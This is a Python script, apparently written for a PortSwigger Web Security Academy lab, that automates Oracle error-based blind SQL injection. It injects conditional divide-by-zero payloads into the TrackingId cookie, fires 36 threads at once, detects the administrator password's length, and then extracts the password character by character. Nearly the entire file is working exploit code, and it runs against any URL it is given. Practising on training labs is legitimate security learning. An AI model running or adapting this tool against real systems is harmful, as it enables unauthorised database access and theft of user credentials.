#!/usr/bin/env python3
"""
oracle_blind_sqli.py
Blind SQL Injection (Oracle) - Lightning Fast Multithreaded
Author: Hasrat Afridi
"""

import requests
import urllib3
import sys
import time
import readline
import signal
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─────────────────────────────────────────
#   CONFIGURATION
# ─────────────────────────────────────────
CHARSET    = "0123456789abcdefghijklmnopqrstuvwxyz"
THREADS    = 36
MAX_LENGTH = 30  # maximum password length to check

# Global state for clean exit
password_so_far = ""
start_time      = None
pwd_length      = 0

# ─────────────────────────────────────────
#   BANNER
# ─────────────────────────────────────────
def banner():
    print("""
╔══════════════════════════════════════════════╗
║   Oracle Blind SQLi - LIGHTNING FAST ⚡      ║
║   All 36 chars fired simultaneously          ║
║   Author : Hasrat Afridi                     ║
╚══════════════════════════════════════════════╝
    """)

# ─────────────────────────────────────────
#   CLEAN EXIT HANDLER
#   Handles Ctrl+C and SIGTERM gracefully
#   Shows partial password if found so far
# ─────────────────────────────────────────
def handle_exit(sig=None, frame=None):
    elapsed = round(time.time() - start_time, 2) if start_time else 0

    print("\n")

    if password_so_far:
        print(f"""
╔══════════════════════════════════════════╗
║         ⚠  INTERRUPTED BY USER          ║
╠══════════════════════════════════════════╣
║  Partial password : {password_so_far:<21}║
║  Characters found : {str(len(password_so_far)) + '/' + str(pwd_length):<21}║
║  Time elapsed     : {str(elapsed) + 's':<21}║
╚══════════════════════════════════════════╝
        """)
    else:
        print("""
╔══════════════════════════════════════════╗
║         ⚠  INTERRUPTED BY USER          ║
║         No characters found yet          ║
╚══════════════════════════════════════════╝
        """)

    print("[!] Exiting cleanly...\n")
    sys.exit(0)

# ─────────────────────────────────────────
#   USER INPUT
# ─────────────────────────────────────────
def get_inputs():
    print("[*] Enter target details\n")

    try:
        url = input("  [?] Lab URL (https://xxx.web-security-academy.net): ").strip()
        if not url.startswith("http"):
            print("  [!] URL must start with https://")
            sys.exit(1)

        tracking_id = input("  [?] TrackingId value (without payload)      : ").strip()
        session     = input("  [?] Session cookie value                     : ").strip()
        username    = input("  [?] Username (default: administrator)        : ").strip()

    except KeyboardInterrupt:
        print("\n\n[!] Input cancelled by user. Exiting...\n")
        sys.exit(0)

    if not username:
        username = "administrator"

    # Validate nothing is empty
    if not url or not tracking_id or not session:
        print("\n  [!] URL, TrackingId and Session cannot be empty")
        sys.exit(1)

    return url, tracking_id, session, username

# ─────────────────────────────────────────
#   EXACT MATCH CHECK
#   = operator only (confirmed working)
#   500 = match, 200 = no match
# ─────────────────────────────────────────
def check_exact(url, tracking_id, session, username, position, char):
    """
    Payload: substr(password, POSITION, 1) = 'CHAR'
    500 -> exact match found
    200 -> not this char
    Raw header to prevent quote encoding
    """
    payload = (
        f"{tracking_id}' and ("
        f"select case when substr(password,{position},1)='{char}' "
        f"then TO_CHAR(1/0) else 'x' end "
        f"from users where username='{username}'"
        f")='x'--"
    )

    headers = {
        "Cookie"    : f"TrackingId={payload}; session={session}",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
        "Accept"    : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }

    try:
        r = requests.get(
            url,
            headers=headers,
            verify=False,
            timeout=10,
            allow_redirects=True
        )
        return char if r.status_code == 500 else None

    except requests.exceptions.ConnectionError:
        print("\n  [!] Connection error - lab may have expired")
        handle_exit()
    except requests.exceptions.Timeout:
        return None  # skip on timeout, other threads will find it
    except Exception as e:
        print(f"\n  [!] Unexpected error: {e}")
        return None

# ─────────────────────────────────────────
#   LENGTH CHECK - Single request per length
#   Uses = operator (confirmed working)
#   500 = length match, 200 = no match
# ─────────────────────────────────────────
def check_length(url, tracking_id, session, username, length):
    """
    Payload: length(password) = LENGTH
    500 -> length matched
    200 -> not this length
    """
    payload = (
        f"{tracking_id}' and ("
        f"select case when length(password)={length} "
        f"then TO_CHAR(1/0) else 'x' end "
        f"from users where username='{username}'"
        f")='x'--"
    )

    headers = {
        "Cookie"    : f"TrackingId={payload}; session={session}",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
        "Accept"    : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }

    try:
        r = requests.get(
            url,
            headers=headers,
            verify=False,
            timeout=10,
            allow_redirects=True
        )
        return r.status_code == 500

    except requests.exceptions.ConnectionError:
        print("\n  [!] Connection error - lab may have expired")
        handle_exit()
    except requests.exceptions.Timeout:
        return False
    except Exception as e:
        print(f"\n  [!] Unexpected error during length check: {e}")
        return False

# ─────────────────────────────────────────
#   PASSWORD LENGTH DETECTION
#   Multithreaded - all lengths at once
#   Range: 1 to MAX_LENGTH
# ─────────────────────────────────────────
def get_password_length(url, tracking_id, session, username):
    """
    Fire all length checks simultaneously
    First 500 response = correct length
    Much faster than sequential checking
    """
    global pwd_length

    print("\n[*] Detecting password length...")

    try:
        with ThreadPoolExecutor(max_workers=MAX_LENGTH) as executor:
            futures = {
                executor.submit(
                    check_length,
                    url, tracking_id, session, username, length
                ): length
                for length in range(1, MAX_LENGTH + 1)
            }

            for future in as_completed(futures):
                length = futures[future]
                result = future.result()

                if result:
                    # Cancel remaining futures
                    for f in futures:
                        f.cancel()
                    pwd_length = length
                    print(f"  [+] Password length found : {length}")
                    return length

    except KeyboardInterrupt:
        handle_exit()

    # Fallback if not found
    print(f"  [!] Could not detect length - defaulting to {MAX_LENGTH}")
    pwd_length = MAX_LENGTH
    return MAX_LENGTH

# ─────────────────────────────────────────
#   FIND ONE CHARACTER
#   All 36 chars fired at same time
#   First 500 wins - rest cancelled
# ─────────────────────────────────────────
def find_char(url, tracking_id, session, username, position):
    """
    Fire all 36 charset chars simultaneously
    First 500 response = answer
    Rest of futures cancelled immediately
    """
    try:
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = {
                executor.submit(
                    check_exact,
                    url, tracking_id, session, username, position, char
                ): char
                for char in CHARSET
            }

            for future in as_completed(futures):
                result = future.result()
                if result is not None:
                    # Cancel all remaining futures immediately
                    for f in futures:
                        f.cancel()
                    return result

    except KeyboardInterrupt:
        handle_exit()

    return None

# ─────────────────────────────────────────
#   MAIN CRACKING LOOP
# ─────────────────────────────────────────
def crack_password(url, tracking_id, session, username):
    global password_so_far, start_time

    # Step 1 - detect password length
    length = get_password_length(url, tracking_id, session, username)

    print(f"\n[*] Starting LIGHTNING extraction ({length} chars)...")
    print(f"    Target  : {username}")
    print(f"    Charset : {CHARSET}")
    print(f"    Threads : {THREADS} per position (all chars at once)")
    print(f"\n    Press Ctrl+C anytime to stop and see partial password\n")

    start_time = time.time()

    for position in range(1, length + 1):
        char = find_char(url, tracking_id, session, username, position)

        # Retry once if failed
        if char is None:
            print(f"\n  [!] Position {position} failed - retrying once...")
            char = find_char(url, tracking_id, session, username, position)

        # Still None after retry - stop
        if char is None:
            print(f"\n  [!] Could not resolve position {position} - stopping")
            break

        password_so_far += char
        elapsed          = time.time() - start_time

        # Progress bar
        done    = "█" * position
        pending = "░" * (length - position)
        print(
            f"  [{done}{pending}] {position}/{length}"
            f"  char='{char}'  found={password_so_far}  ({elapsed:.1f}s)   ",
            end="\r"
        )

    print()
    return password_so_far

# ─────────────────────────────────────────
#   MAIN
# ─────────────────────────────────────────
def main():
    global start_time

    # Register signal handlers for clean exit
    signal.signal(signal.SIGINT,  handle_exit)  # Ctrl+C
    signal.signal(signal.SIGTERM, handle_exit)  # kill command

    banner()

    url, tracking_id, session, username = get_inputs()

    print(f"""
[*] Configuration:
    URL      : {url}
    Username : {username}
    Tracking : {tracking_id[:20]}...
    Session  : {session[:20]}...
    Threads  : {THREADS} per position
    Max Len  : {MAX_LENGTH}
    Method   : All chars simultaneously ⚡
    """)

    try:
        confirm = input("[?] Start cracking? (y/n): ").strip().lower()
    except KeyboardInterrupt:
        print("\n\n[!] Cancelled. Exiting...\n")
        sys.exit(0)

    if confirm != 'y':
        print("[!] Aborted by user.\n")
        sys.exit(0)

    start_time = time.time()
    password   = crack_password(url, tracking_id, session, username)
    total      = round(time.time() - start_time, 2)

    if password:
        print(f"""
╔══════════════════════════════════════════╗
║        ⚡ PASSWORD FOUND! ⚡             ║
╠══════════════════════════════════════════╣
║  Username : {username:<29}║
║  Password : {password:<29}║
║  Time     : {str(total) + 's':<29}║
╚══════════════════════════════════════════╝
        """)

if __name__ == "__main__":
    main()
